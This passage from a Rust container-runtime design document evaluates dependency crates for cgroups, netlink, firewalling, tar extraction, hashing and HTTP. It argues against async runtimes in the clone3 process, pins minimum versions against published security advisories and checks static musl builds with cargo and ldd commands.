`nix = "0.25.0"`, optional `oci-spec` and `serde`, `thiserror = "1"`, and **`zbus = "5.8"` — not
optional, no feature gate, unconditional.** `zbus 5` pulls `async-broadcast`, `async-trait`,
`event-listener`, `futures-core`, `futures-lite`, `enumflags2`, `serde_repr`, `tracing`, `uuid`,
`winnow`, `zvariant`, `zbus_names`, `zbus_macros` and **`nix ^0.30`** — and, enabled by its
*default* features, `async-io`, `async-executor`, `async-task` and **`blocking`**.

**Recommendation.** Three consequences, in increasing seriousness:

1. Two semver-incompatible `nix` crates in one binary (`nix 0.25.0` directly, `nix ^0.30`
   transitively through `zbus`), in a project whose conclusion is to have **no** `nix` — plus a
   second `thiserror` major version.
2. Three of `zbus`'s own core crates — `zvariant`, `zbus_names`, `zvariant_derive` — were marked
   **unmaintained** in the advisory DB on **2026-10-16** (RUSTSEC-2026-0370/-0371/-0372, no patch).
3. **The disqualifying one:** `blocking` is, by its own description, *"a thread pool for isolating
   blocking I/O in async programs"*, and `async-io` is an async reactor. Putting `cgroups-rs` in the
   core crate **puts an executor and a thread pool in the address space that calls `clone3`** — a
   direct violation of §15.4.1's one load-bearing invariant. That is not a dependency-weight
   objection.

`kata-containers/cgroups-rs` is 157 stars, 24 open issues, pushed 2026-10-23, 15 `unsafe` in 12,052
lines, zero advisories. **It is a good crate. It is the wrong crate for this process.**

**Unverified.** The thread-pool claim is argued from `blocking`'s and `async-io`'s own descriptions,
not from a running process. The test, on the dev VM: a binary that links `cgroups-rs`, does one
cgroup write, then reads `Threads:` from `/proc/self/status` — expect `> 1`.

**Recommendation.** The one place a cgroup library would genuinely earn its keep is cgroup **v1**
(eight hierarchies, per-controller path discovery) and **systemd delegation over D-Bus** — and we
want neither. Read youki's `libcgroups` as the reference for the systemd driver if we ever build
that path; do not link it.

#### 15.5.5 netlink and firewall crates

**Recommendation on netlink: take the packet crates, write the socket loop, skip `rtnetlink`.**

| Crate | Version / date | Health | Verdict |
|---|---|---|---|
| `netlink-sys` | 0.9.0, 2026-08-18 | no advisories; non-optional deps are only `bytes`, `libc`, `log` — every async backend is `optional` | **take** |
| `netlink-packet-core` | 0.9.0, 2026-08-18 | **0 `unsafe`** in 2,653 lines; it *is* `nlmsghdr` in Rust types | **take** |
| `netlink-packet-route` | 0.33.0, 2026-08-18 | **0 `unsafe`** in ~47,000 lines; no advisories; pulls `zerocopy 0.8`, far past its one historical advisory | **take** |
| `netlink-proto` | 0.13.0 | hides sequencing and demux — the part worth owning | **avoid** |
| `rtnetlink` | 0.23.0, 2026-08-18 | disqualified on two substrate grounds, below | **avoid** |
| `nftnl` + `nftnl-sys` | 0.9.4, 2026-08-11 | FFI to C `libnftnl` + `libmnl`; depends on `nix ^0.31.2`; carries the **only memory-corruption advisory in the whole candidate set** | **avoid** |
| `nftables` | 0.6.3, 2025-08-15 | zero `unsafe` — **because it shells out** | **open — see below** |

**Convention.** `rtnetlink 0.23.0` depends on **`nix ^0.30.0` non-optionally**, so taking it
re-introduces the exact dependency §15.1 declined, at a two-minor lag. And `futures-channel` and
`futures-util` are **non-optional**: its entire API is `async fn`, and the `tokio` /
`async-global-executor` features choose *which* executor, not *whether*. It is structurally
incompatible with a sync core.

**Recommendation.** The sync path exists and should be named: **`netlink-sys` +
`netlink-packet-core` + `netlink-packet-route`, without `rtnetlink`** — synchronous, executor-free,
`nix`-free. That is also what a production Rust container network stack ships: the packet crates
plus its own ~200-line synchronous socket loop, with no `rtnetlink`, no `netlink-proto`, no `nftnl`
and no `iptables` crate anywhere in its manifest. **What we write (~250 lines, and this is where the
learning is):** bind, connect, sequence numbers, multipart/`NLMSG_DONE` walking, `NLM_F_DUMP_INTR`
restart, `ENOBUFS`, and mapping `NetlinkPayload::Error` onto a typed error the setup path can branch
on; plus the setns-pinned-thread primitive. **One gotcha worth importing from production code:** set
`NETLINK_GET_STRICT_CHK` on every socket (`socket.set_netlink_get_strict_chk(true)`) — without it
the kernel ignores the filter fields in a dump request and hands back the whole table.

**Trap.** `nftnl` carries **RUSTSEC-2025-0126** (2025-10-18), *"Heap-buffer-overflow in
`nftnl::Batch::with_page_size`"* — the C side allocates an insufficient buffer for a small or
malformed page size, causing out-of-bounds writes. Patched ≥ 0.9.0 and 0.9.4 is safe, so the version
is not the issue. The signal is that it is FFI to C, colliding with static musl exactly as
`libseccomp` does, and that 61 K downloads per 90 days means very few eyes on that surface.

**Open decision — `nftables 0.6.3` is not a netlink library.** **Convention** —
`nftables-0.6.3/src/helper.rs:13` is `const NFT_EXECUTABLE: &str = "nft"; // search in PATH`, and
lines 97, 171, 285 and 416 are each `Command::new(program)`. It is a JSON-over-subprocess wrapper
around the `nft(8)` binary, and its zero `unsafe` in 3,281 lines is a consequence of making no
syscalls at all. Both positions, because this is genuinely open:

- **For.** One `nft -j -f -` per container start is **one kernel transaction** — atomic, typed rule
  construction via serde, named sets and maps, `inet`-family single-table rules, no C linkage. We
  still own every *design* decision (which chains, hooks, priorities, sets, in what order) and
  decline to own one byte-encoding for which `nft` is the reference compiler. Owning nftables
  expression encoding is roughly a month and teaches us about nftables' internal representation, not
  about containers. It is what a production Rust backend ships permanently, not as a stopgap.
- **Against.** The charter is *"we own the runtime core, we do not shell out"*. It adds a runtime
  dependency on an external binary and its version; errors arrive as stdout/stderr strings, so we
  cannot branch on an errno; and it is one `fork`+`exec` per container start.

**Recommendation.** Decide it explicitly, **behind a firewall trait** so the choice is reversible,
and record which position was chosen and why. If `nft(8)` is taken, detect its presence at
**startup** and fail with a clear message — never discover it mid-setup. The pure-Rust end state is
`rustables 0.8.8` (5,753 lines, 13 `unsafe`, no C, ~20 K downloads per 90 days); revisit it behind
the trait if it matures. And avoid the `iptables` crate outright: it is `Command::new("iptables")`
that parses `--version` with a regex and keeps two code paths for which flags the host binary
supports — the crate's own existence is the evidence against the approach.

**Note on `nix` in the networking set.** Earlier research took `nix` here for `sched::{unshare,
setns}`, `mount::{mount, umount2}`, `fcntl::Flock` and `net::if_::if_nametoindex`. All of those
except `signalfd` are in `rustix` (§15.1), and §15.4.2 flags `Flock`'s panicking `Drop`. Networking
is not a reason to take `nix`.

#### 15.5.6 tar, compression and hashing

| Crate | Version / date | MSRV | Advisories | Verdict |
|---|---|---|---|---|
| `tar` | 0.4.46, 2026-05-18 | 1.63 | **4** — two recent and directly relevant | **take, pin `>= 0.4.45`** |
| `flate2` | 1.1.10, 2026-08-28 | 1.67 | none | **take** — pure-Rust `miniz_oxide` backend is the default; no C, musl-clean |
| `zstd` | 0.14.3, 2026-10-16 | 1.64 | none | **take, with a build caveat** |
| `sha2` | 0.11.1, 2026-10-12 | **1.88** | one, patched ≥ 0.9.8 | **take** |
| `ring` | 0.17.14, 2025-03-11 | 1.66 | **RUSTSEC-2025-0007: unmaintained** | **avoid** |

**Recommendation — `tar` as a header *parser* only.** Iterate `Archive::entries()`, read
`entry.header()`, `entry.path_bytes()` and `entry.link_name_bytes()`, apply our own validation, and
perform every filesystem operation ourselves through a pinned-root fd. **Never call `unpack` /
`unpack_in`.** We must implement whiteout translation and the device-node/xattr policy anyway, so
`unpack` cannot be used as-is; its containment is exactly the code path two advisories have landed
on; and tar *header* parsing (ustar/PAX/GNU, octal fields, checksums, sparse maps) is genuinely
fiddly, has no security surface once the fields are treated as untrusted data, and is the right
thing to delegate.

**Trap — pin `tar >= 0.4.45` explicitly, not `"0.4"`.** Two advisories, both filed **2026-03-19**:
**RUSTSEC-2026-0067** (CVE-2026-33056) — `unpack_dir` used `fs::metadata()`, which follows symlinks,
to test whether an existing path is a directory, so a crafted archive with a symlink entry followed
by a same-named directory entry gets the **symlink target** chmod'd, outside the extraction root;
and **RUSTSEC-2026-0068** (CVE-2026-33055) — *"tar-rs incorrectly ignores PAX size headers if header
size is nonzero"*. The second is less a bug than a statement that **tar parsing is not canonical**:
other implementations unconditionally honour the PAX size override, and a size discrepancy between
parsers is a tar-smuggling primitive. The same archive unpacks differently under different tools,
which makes it a **content-addressing** hazard for any design that computes a layer digest with one
parser and extracts with another — not merely a hardening note.

**Recommendation — `sha2`, not `ring`, and the reason has changed.** **RUSTSEC-2025-0007**
(2025-02-20) declares **`ring` unmaintained, with no patched version**; `briansmith/ring` was last
pushed 2026-07-23 and 0.17.14 has not moved since 2025-03-11. It also carries RUSTSEC-2025-0009 (AES
panic with overflow checks, patched ≥ 0.17.12). `sha2` is RustCrypto, actively released, pure Rust
with CPU-feature-detected acceleration, 326 M downloads per 90 days. **The cost to record:**
`sha2 0.11`'s MSRV is **1.88**, higher than everything else we take, so it — not the CLI parser —
sets the project MSRV (§15.7.2).

**Build caveat on `zstd`.** `zstd-sys` compiles **vendored C** with the `cc` crate. That is not a
`pkg-config` lookup and it generally works for musl, but it puts a C cross-compiler in the build
requirements for whichever binary links it. The **core** binary is unaffected, because compression
belongs to the pull/extract path. `ruzstd` (pure Rust) is the escape hatch.

**Operational footgun, whichever HTTP client is used.** Disable automatic content-decoding (turn the
`gzip` feature off, or send no `Accept-Encoding: gzip`). A layer blob is *already* gzip, and an HTTP
layer that transparently gunzips it silently breaks the compressed-digest check.

#### 15.5.7 HTTP clients

| Crate | Version / date | Non-optional deps | Verdict |
|---|---|---|---|
| `ureq` | 3.5.0, 2026-10-21 | `base64`, `log`, `percent-encoding`, `ureq-proto`, `utf8-zero` — **no `tokio`, no `futures`, no `mio`**; TLS behind a feature | **first choice** |
| `reqwest` | 0.13.5, 2026-09-08 | async over `hyper`; TLS, pooling, redirect policy incl. stripping sensitive headers cross-origin | **second choice**, in a separate process |
| `hyper` | 1.12.0, 2026-10-06 | HTTP/1+2 framing only | **avoid** — no TLS, no redirects, no pooling; implementing those is HTTP plumbing, not container mechanics |

**Does it hide what we want to learn?** No — HTTP/1.1 and TLS are *inputs* to this project's
subject, not the subject. What matters is that the redirect-credential rule is got right by default,
which is a real correctness property rather than convenience. See §15.6.2 for why `ureq` is worth
more than it looks.

#### 15.5.8 The small single-maintainer utility crates

The question for each: does it earn a dependency over a few dozen lines of our own?

| Crate | Latest / date | Verdict | Why |
|---|---|---|---|
| **`pentacle`** | 1.1.0, 2024-10-03 | **take** | Deps are `libc` + optional `log`. `ensure_sealed()` is the ~60 lines the `/proc/self/exe` self-overwrite defence (CVE-2019-5736) demands, called as line 1 of `main()`. Two years without a release is *finished*, not abandoned, for a one-function crate over a stable kernel interface with zero open issues. |
| **`memfd`** | 0.6.6, 2026-09-01 | **take if wanted** (upgraded from "defer") | **Its only dependency is `rustix ^1.0`.** It was deferred at "~40 lines", costed as a new dependency. It is not: we already take `rustix`, so the marginal graph cost is **zero crates**. 15 M downloads per 90 days, no advisories. |
| **`pathrs`** | 0.2.6, 2026-09-06 | **avoid for phase 1** | Built on `rustix ^1.1` (good), plus `itertools`, `memchr`, `once_cell`, `static_assertions`, `rustversion`. Decline for the *mechanism* reason: `rustix::fs::openat2` with `ResolveFlags::{BENEATH, NO_MAGICLINKS, NO_SYMLINKS}` is the **kernel** resolving paths safely, which beats any userspace reimplementation. `cyphar/libpathrs` is healthy. Revisit only for kernels without `openat2` (< 5.6). **Trap:** its licence `MPL-2.0 OR LGPL-3.0-or-later` is often called the only copyleft in reach — MPL-2.0 is *file-level* weak copyleft and does not reach our code. An annoyance to record, not a blocker; do not decline it for the wrong reason. |
| **`safe-path`** | 0.1.0, 2022-04-22 | **avoid** | Four and a half years at 0.1.0, no second release. Same job as `pathrs`, less maintained. |
| **`procfs`** | 0.18.0, 2025-08-30 | **avoid now, take later** | **Convention** — `default = ["chrono", "flate2", "procfs-core/default"]`, verbatim. A naive `procfs = "0.18"` pulls `chrono` **and** `flate2` (the latter to read a compressed kernel config we will never read) for one integer. Built on `rustix ^1.0.1`, 3 `unsafe` in 5,135 lines, no advisories. Take with `default-features = false` the day we need a second `/proc` file; until then parse `/proc/<pid>/stat` field 22 in ~10 lines — **splitting after the *last* `)`**, because `comm` in field 2 is parenthesised and may contain spaces and `)`. |
| **`prctl`** | 1.0.0, 2015-12-15 | **avoid** | Eleven years, one release. Its 1.9 M downloads are one downstream runtime and its dependents, not independent adoption. Everything in it is in `rustix::thread::prctl` / `rustix::process::prctl`. |
| **`nc`** | 0.9.8, 2026-06-03 | **avoid** | Raw syscall wrappers including `clone3`. 208 K downloads per 90 days is negligible for something that would own the single most important `unsafe` call in the project. Write §15.2's ~15 lines ourselves, with the two trap comments on them. |
| **`close_fds`** | 0.3.2, 2021-06-05 | **avoid** | Five years stale — and the one-line replacement is §15.2's `libc::syscall(libc::SYS_close_range, …)`, *not* a rustix function (§15.1.4). Still one line, still no crate. |
| **`command-fds`** | 0.3.3, 2026-04-10 | **avoid** | Active and good at mapping fds for `std::process::Command`. We do not spawn via `Command`; we `clone3` and the child arranges its own fds. Wrong shape. |
| **`sendfd`** | 0.4.5, 2026-09-26 | **avoid** | Healthy, but its API traffics in `RawFd`: `recv_with_fd(…, fds: &mut [RawFd])`. A received pty master is then owned by nothing until we wrap it — a hang, not a leak. `rustix::net`'s `RecvAncillaryMessage::ScmRights` yields `OwnedFd` **directly**. ~40 lines of `sendmsg`/`recvmsg` + `cmsg_space!` and the ownership is right by construction. |
| **`signal-hook`** | 0.4.5, 2026-10-04 | **avoid** | Excellent, very healthy, no advisories. It exists to make *signal handlers* safe; we structurally avoid handlers in favour of `signalfd` / pidfd + `epoll`. Revisit only if `SIGWINCH` forwarding needs one. |
| **`scopeguard`** | 1.2.0, 2023-07-17 | **defer** | Three releases in seven years at 240 M downloads per 90 days is *finished*, not abandoned. But the guard we want has a `.commit()` that disarms and is named per resource, so a rollback list can reuse one `Cleanup` enum — ~20 lines and better shaped. Take it the day the hand-rolled version grows a second axis. |
| **`fs2`** | 0.4.3, 2018-01-06 | **avoid** | Eight years unmaintained, and `flock` is one `rustix` call. |

---

### 15.6 The async boundary

#### 15.6.1 Where async is disqualified outright, and by what mechanism

**Recommendation.** The container-creation path must run in a process that has **never had a second
thread**. An async runtime in that process is a correctness bug, not a weight problem.

**Convention.** This is mechanical, from `tokio 1.54.1`'s own source. `src/runtime/builder.rs:2184`,
`build_threaded_runtime`, computes `worker_threads = self.worker_threads.unwrap_or_else(num_cpus)`,
creates the blocking pool, and calls **`launch.launch()` at `:2236` — inside `build()`**.
`src/runtime/scheduler/multi_thread/worker.rs:512` is
`for worker in self.0.drain(..) { runtime::spawn_blocking(move || run(worker)); }`, and
`src/runtime/blocking/pool.rs:508` is `thread::Builder::new()…spawn(…)`. `#[tokio::main]` is
`new_multi_thread` by default. **So the threads exist before the first line of `main`'s body runs**,
and a `clone3` from that process clones from a process with N poisoned-lock-capable thread stacks
and — per §15.4.1 — an inherited `header.multiple_threads` that `clone3` does not reset.

**Trap — the obvious escape hatch does not work, and the failure mode is ordinary.**
`build_current_thread_runtime` (`builder.rs:1729`) does **not** call `launch()`; the current-thread
scheduler runs on the calling thread, and `create_blocking_pool` only *configures* the pool, with
`spawn_thread` called lazily on the first `spawn_blocking`. So
`#[tokio::main(flavor = "current_thread")]` genuinely has one thread **at construction**. But
`tokio::fs::*` is implemented **entirely** in terms of `spawn_blocking`, as is
`tokio::net::lookup_host` and therefore every `TcpStream::connect("host:443")`. The invariant holds
until the first file read or DNS lookup, at which point a thread appears and never goes away.
**"Never had a second thread" cannot be maintained by choosing a runtime flavour.** It is not a
careless `lazy_static` that breaks it; it is `tokio::fs::read`.

**Recommendation.** Enforce it structurally: **two crates.** A `core` crate that lists its
dependencies and nothing else, ever, and a `cli` crate that depends on `core`. Then "no tokio in the
fork path", "no `anyhow` in the core" and "no async runtime anywhere near `clone`" stop being rules
someone must remember and become `cargo build` failures. The guard is a CI step, not a one-off:
`cargo tree -p core -e normal -i tokio` must fail with *"did not match any packages"*.

#### 15.6.2 Where async *is* appropriate — and why it may not be needed at all

**Recommendation.** The boundary, by path: `create`/`start` strictly **synchronous**; the supervisor
event loop a synchronous **`epoll`**; layer extraction a **`std::thread` pool**, not async, because
it is `read`/`openat`/`write` on local disk — blocking syscalls async cannot usefully overlap; CLI
read paths synchronous; and the **registry pull** the one place real I/O parallelism pays, where
6–12 blob downloads in flight over TLS is a genuine wall-clock win.

**Recommendation — and the conclusion from that last item should be weakened, in a good direction.**
`ureq 3.5.0`'s non-optional dependency list is `base64`, `log`, `percent-encoding`, `ureq-proto`,
`utf8-zero` — **no `tokio`, no `futures`, no `mio`**, with TLS behind a feature. Six parallel blob
downloads over `std::thread` + `ureq` is six threads and an `mpsc` channel, buying the same
parallelism with no executor anywhere in the project. So:

1. **First choice: synchronous `ureq` + a `std::thread` pool in the pull path.** Then "no async
   runtime anywhere in this project" is simply true, and the separate-process rule stops being the
   enforcement mechanism for the project's biggest rewrite-risk decision and becomes merely tidy —
   which is strictly better, because a structural rule you no longer depend on is a rule that cannot
   be broken by accident.
2. **Second choice, if the pull path needs more** (HTTP/2 multiplexing, or pooling behaviour that
   matters at scale): `reqwest` + `tokio`, **in the `pull` binary only**, as a separate *process* —
   not merely a separate module.

**Recommendation.** Keep the separate-process rule either way: it costs nothing when unused and it
is the only thing that saves us if choice 2 happens later. The stronger constraint holds under both:
**the extractor must not depend on `tokio`, `reqwest`, or any async runtime.** Its input is
`impl std::io::Read` or a file path, never `impl AsyncRead`. That one rule keeps the
security-critical extraction code testable, synchronous, and callable from a plain `fn` — including
from paths that have no network at all.

**Recommendation.** If `tokio` is used anywhere, pin **`>= 1.54.1`**: 1.54.0 has been **yanked**
(§15.7.1). And note **RUSTSEC-2026-0386** (2026-10-13): `AsyncFd::new` and its siblings violate I/O
safety — they accept any `T: AsRawFd`, so safe code can build an `AsyncFd` over a closed or
arbitrary fd, and a dup'd-then-closed fd whose number is reused produces a **use-after-free** when a
readiness event fires. They are now deprecated in favour of `unsafe`
`register`/`register_with_interest`. `AsyncFd` is precisely the API a tokio-based supervisor would
use to wrap a `signalfd`, a `pidfd` or a rendezvous FIFO — a dated, concrete argument for the
synchronous `epoll` loop.

#### 15.6.3 The logging-deadlock question, settled

**The question left open:** does a `tracing-subscriber` `fmt` layer deadlock in a post-`clone` child?
**Answer: no, not by itself — and the real hazard is somewhere else.**

**Convention.** `tracing-subscriber-0.3.23/src/fmt/fmt_layer.rs:1017`, the entire event path,
formats into `thread_local! { static BUF: RefCell<String> }` guarded by `try_borrow_mut()` with a
fresh `String::new()` fallback, then calls `self.make_writer.make_writer_for(…)` and `write_all`.
Three findings:

1. **The formatting buffer is a `thread_local! { RefCell<String> }`, not a `Mutex`.** There is **no
   process-wide lock** in the format step, and the `try_borrow_mut` fallback handles re-entrancy.
   After a `clone`, the child's TLS is its own private copy and it is un-borrowed unless the cloning
   thread was itself inside `on_event`.
2. **The lock risk is entirely the `MakeWriter`'s**, and `make_writer_for` is called *inside*
   `on_event`. With the default writer (`io::stdout`/`io::stderr`) it is `std::io::stdio`'s
   **`ReentrantLock`** plus the inherited **`LineWriter`** buffer — the same hazard any `println!`
   creates, tracing or not. With the documented file sink (`with_writer(Mutex::new(file))`,
   `src/fmt/writer.rs:808-816`) `make_writer` is
   `MutexGuardWriter(self.lock().expect("lock poisoned"))` — a real `std::sync::Mutex` that a dead
   thread can leave locked and that **panics** on poison.
3. **It allocates unconditionally.** The buffer is a `String` that `format_event` grows, and the
   fallback is a fresh `String::new()`. **So even with a lock-free writer, a logging call in the
   child is forbidden by §15.4 regardless.**

**Recommendation — what changes and what does not.** Nothing structural: the child gets a raw fd and
`write(2)`s pre-formatted bytes. What changes is the **supervisor-side** mitigation, which is what
the question was actually about. There is no tracing-specific lock to avoid, so a rule like *"never
log between the last log call and the clone"* is both unenforceable and aimed at the wrong thing.
The real pre-`clone` hazard is `std::io::Stdout`'s lock and buffer, and the mitigation is
**§15.4.2's two `flush()` statements** beside the `Threads: 1` assertion. Two statements are
enforceable; a rule about call sites is not.

**Recommendation.** If the supervisor ever logs to a **file**, `with_writer(Mutex::new(file))` *is*
a real `Mutex` with a `.expect("lock poisoned")`, and the pre-clone flush does not help. Use a
dedicated append-only fd and `write(2)`. Note the non-blocking appender alternative **spawns a
thread**, which §15.6.1 forbids outright in that process. The safe answer is the raw fd.

**Unverified.** The file-sink deadlock is inferred from `MutexGuardWriter`'s shape; the
default-stdout case is settled from source. The test, on the dev VM: a parent with
`with_writer(Mutex::new(file))`, a second thread looping on log events, then `clone3` and one log
call in the child — expect a hang or a poison panic.

---

### 15.7 Advisories, versions and build

#### 15.7.1 The pinned minimum versions, and what each one fixes

The audit ran against a `RustSec/advisory-db` clone at head **`84d943a6`, committed 2026-10-23**.
Ninety-five advisories were filed DB-wide on or after 2026-09-04; **nine** touch this crate set.
Crates in the candidate set with **zero advisories, ever**: `rustix`, `libc`, `caps`, `oci-spec`,
`cgroups-rs`, `seccompiler`, `libseccomp`, `flate2`, `zstd`, `ureq`, `reqwest`, `serde`,
`serde_json`, `clap`, `thiserror`, `procfs`, `pathrs`, `memfd`, `pentacle`, `nc`, `prctl`,
`close_fds`, `command-fds`, `sendfd`, `signal-hook`, `scopeguard`, `rtnetlink`,
`netlink-packet-route`, `netlink-sys`, `nftables`, `bitflags`, `linux-raw-sys`.

| Pin | Advisory | What it fixes |
|---|---|---|
| **`tar >= 0.4.45`** | RUSTSEC-2026-0067 (CVE-2026-33056), RUSTSEC-2026-0068 (CVE-2026-33055), both 2026-03-19 | `unpack_in` chmod'ing arbitrary directories through a symlink; and the PAX-size divergence that makes tar parsing non-canonical — a **tar-smuggling and content-addressing** hazard, directly on the image-extraction path. Pin **explicitly**, not `"0.4"` |
| **avoid `ring`** | RUSTSEC-2025-0007, 2025-02-20 | `informational = "unmaintained"`, **no patched version**. Plus RUSTSEC-2025-0009 (AES panic, patched ≥ 0.17.12). Use `sha2` |
| **`tokio >= 1.54.1`** (if used) | RUSTSEC-2026-0384, **2026-10-21** | Race between `Interval::poll_tick` and the time driver on the multi-threaded runtime: a data race and **use-after-free on the timer waker in safe Rust**. **`tokio 1.54.0` has been yanked** — make sure it is not in `Cargo.lock` |
| `tokio` — API note | RUSTSEC-2026-0386, 2026-10-13 | `AsyncFd::new` violates I/O safety; constructors deprecated in favour of `unsafe` ones (§15.6.2) |
| **`rustls >= 0.23.46`** | RUSTSEC-2026-0285 (2026-09-14); -0346/-0347/-0348/-0349 (2026-10-14) | TLS 1.3 handshake messages accepted across encryption-level boundaries; `Debug` impls leaking TLS secrets; buffered application data sent to the outer server after ECH rejection; **brotli certificate decompression allocating up to 1 GiB pre-authentication**; an unauthenticated ServerHello downgrading later connections |
| **`rustls-webpki >= 0.103.16`** | RUSTSEC-2026-0382, 2026-10-20 | Certificate verification may accept distrusted intermediates |
| **`webpki-roots >= 1.0.10`** | RUSTSEC-2026-0381, 2026-10-19 | Bundled roots trust distrusted intermediates |
| **`tracing-subscriber >= 0.3.23`** | RUSTSEC-2025-0055 / CVE-2025-58160, 2025-08-29 | **Format injection**, not memory: *"Logging user input may result in poisoning logs with ANSI escape sequences."* **Not merely historical for us** — a container engine logs attacker-controlled strings routinely: image names, OCI annotation values, `process.args`, container names. Keep ANSI sanitisation enabled, and do not reach for `with_ansi(false)` thinking it is the same control |
| **`anyhow >= 1.0.103`** | RUSTSEC-2026-0190, 2026-06-25 | `informational = "unsound"` — UB in `Error::downcast_mut()` after `Error::context(…)`. Current 1.0.104 is past it; we never call it, and `anyhow` is confined to the CLI crate |
| **avoid `zbus`-rooted graphs** | RUSTSEC-2026-0370/-0371/-0372, **2026-10-16** | `zvariant`, `zbus_names`, `zvariant_derive` all marked **unmaintained, no patch** — and `zbus` is `cgroups-rs`'s unconditional dependency (§15.5.4) |
| **avoid `nftnl`** | RUSTSEC-2025-0126, 2025-10-18 | Heap-buffer-overflow in `Batch::with_page_size`; patched ≥ 0.9.0, so the version is fine, but it is C FFI (§15.5.5) |

**Recommendation.** `rustls`, `rustls-webpki` and `webpki-roots` are resolved transitively by both
`ureq 3.5.0` and `reqwest 0.13.5`, so those three pins apply whichever HTTP client is chosen. And
RUSTSEC-2026-0348 — brotli certificate decompression allocating up to 1 GiB **before
authentication** — belongs in the registry threat model, not just the dependency table: a hostile or
MITM'd registry endpoint is an unauthenticated remote attacker against our TLS stack, and `pull` is
the one place our process talks to one.

**Trap.** The single historical `nix` advisory, RUSTSEC-2021-0119 (out-of-bounds write in
`nix::unistd::getgrouplist`), is worth reading as a **class**, not an incident: a safe Rust wrapper
around a libc function whose buffer contract the wrapper got wrong. That is the failure mode a
libc-wrapping crate has and a direct-syscall crate structurally cannot — a better argument than
either crate's advisory count.

#### 15.7.2 What sets the project's minimum supported Rust version

**Convention.** MSRVs across the recommended set: `rustix` **1.63**, `tar` 1.63, `zstd` 1.64, `libc`
**1.65**, `flate2` 1.67, `thiserror` 1.71, `clap 4.6` **1.85**, `ureq` 1.85, `reqwest` 1.85,
`sha2 0.11` **1.88**.

**Recommendation.** The project MSRV is **1.88, set by `sha2 0.11`** — not by anything in the
runtime core. The next floor down is **1.85**, set by the CLI argument parser. Record *why*: neither
is a technical requirement of the container engine, and both live outside the `core` crate, where
nothing needs anything past 1.65. If the MSRV ever becomes a constraint, the levers are `sha2 0.10`
and a different argument parser, in that order — not a change to the substrate.

#### 15.7.3 The static-musl question, and the exact command that confirms it

**Recommendation.** Target `x86_64-unknown-linux-musl`, statically linked, on **stable**. The
question decomposes into facts that are all checkable, and all check out.

1. **The target is built into stable rustc and `crt-static` is its default.** Run locally
   (`rustc 1.96.0`, stable): `rustc --print cfg --target x86_64-unknown-linux-musl` prints
   `target_env="musl"` **and `target_feature="crt-static"`**, where the gnu target prints no
   `crt-static`. Static linking is the **default** for that target, not a flag, and naming it needs
   no nightly. `rustup target add x86_64-unknown-linux-musl` ships a prebuilt `libc.a`
   ("self-contained" linking), so no external `musl-gcc` is required **provided no crate runs a C
   compiler**.
2. **`rustix` picks `linux_raw` on musl and compiles no C.** The backend decision keys on
   `target_os`, not `target_env` (§15.1.2), and `grep -c "cc::\|pkg_config"` over
   `rustix-1.1.5/build.rs` returns **0**.
3. **No crate in the recommended core set runs a C compiler or `pkg-config`.** Measured:
   `rustix-1.1.5` has a `build.rs` with no build-dependencies; so does `libc-0.2.191`;
   `seccompiler-0.5.0` and `oci-spec-0.10.0` have none at all; **`libseccomp-0.4.0` is the only one
   with `build-dependencies: pkg-config`.** `serde`, `serde_json`, `thiserror`, `tracing`, `clap`,
   `anyhow` and `pentacle` are pure Rust. So **`libseccomp` is the single crate in the whole
   candidate set that needs a C library**, and §15.5.2 declines it.
4. **Why other Rust runtimes need nightly and `-Zbuild-std` and we do not.** That requirement is a
   property of *their dependency set*, not of musl: `libseccomp` (C) plus FFI crates. A C library
   that must itself be musl-built is what forces `-Zbuild-std`. In the form that is actually
   checkable: **the musl obstacle is C dependencies, and our recommended set has exactly one
   candidate, which we decline.**
5. **The one residual risk**, and the first thing the dev VM should check: `zstd-sys` compiles
   vendored C with the `cc` crate (§15.5.6). That affects the **pull/extract** binary, not the core.
   `ruzstd` is the escape hatch.

**Unverified — determined from build requirements, not run.** No Rust toolchain exists on either
remote host, and the local toolchain is darwin/aarch64. The exact test, on a Linux host:

```bash
rustup target add x86_64-unknown-linux-musl
cargo build -p core --target x86_64-unknown-linux-musl --release
ldd  target/x86_64-unknown-linux-musl/release/mydocker   # expect: "not a dynamic executable"
file target/x86_64-unknown-linux-musl/release/mydocker   # expect: "statically linked"
cargo tree -p core --target x86_64-unknown-linux-musl -e normal --prefix depth
                                                        # expect: no tokio, no nix, no zbus, no *-sys
cargo tree -p core -e normal -i tokio                   # expect: "did not match any packages"
```

**Recommendation.** Make the last two `cargo tree` lines a **CI step**, not a one-off. The two-crate
split is the structural rule; a `cargo tree -i tokio` that must fail is how that rule announces
itself the moment someone breaks it.

---

### 15.8 Recommended dependency set for the MVP

Four crate boundaries. The boundaries are the enforcement mechanism, not an organisational
preference: `core` lists these dependencies **and nothing else, ever**.

**`crates/core` — the supervisor and the container-init path. Never links an async runtime, never
links `anyhow`.**

| Crate | Version floor | What it is for | If it disappeared |
|---|---|---|---|
| `rustix` | **1.1.5** pinned, `default-features = false, features = ["std","fs","mount","process","thread","net","event","pipe","pty","system"]` | the single syscall layer: namespaces, the new mount API, `pivot_root`, `openat2`, pidfds, prctls, capability sets, `epoll`, `SCM_RIGHTS` with `OwnedFd` | ~40 thin `libc::syscall` wrappers **plus** the ~180-line `capget`/`capset` v3 block `libc` does not supply (§15.2) |
| `libc` | **0.2.191**, `default-features = false` | `SYS_*` numbers, `clone_args` / `mount_attr` / `open_how` layouts, and §15.2's seven raw calls | the struct layouts by hand (~80 lines) plus per-architecture syscall numbers — the reason `libc` stays even though `rustix` needs it only optionally |
| `oci-spec` | **0.10.0** pinned, `default-features = false, features = ["runtime"]` | the `config.json` serde data model, converted once into our own `Config` | several hundred lines of transcription across ~55 types, stale on every spec revision |
| `seccompiler` | **0.5.0** | compiles a rule set into a `Vec<sock_filter>`, **parent-side** | an 8-opcode cBPF emitter plus the jump arithmetic and 64-bit-comparison-as-two-32-bit-loads that are the easy things to get wrong |
| `serde` + `serde_json` | 1.0 / 1.0 | `config.json` in, `state.json` and log lines out | not worth considering |
| `thiserror` | **2.0** | typed per-phase error enums, each carrying an errno explicitly so the rollback decision is made *from* the error and the enum converts losslessly into the child's fixed-size record | ~100 lines of `impl Error` boilerplate |
| `tracing` | 0.1 | structured logging in the supervisor's steady state only — never in the child (§15.6.3) | `eprintln!`, honestly |

Plus, if networking lives in `core` rather than its own crate: `netlink-sys` **0.9**,
`netlink-packet-core` **0.9**, `netlink-packet-route` **0.33** (the RTM_* codec — ~47,000 lines of
TLV tedium with no learning past the first hour) and `ipnet` **2**. The socket loop, the sequencing,
the `NLMSG_DONE` walking and the typed error mapping are ours (~200 lines), as is the
setns-pinned-thread primitive (~50 lines).

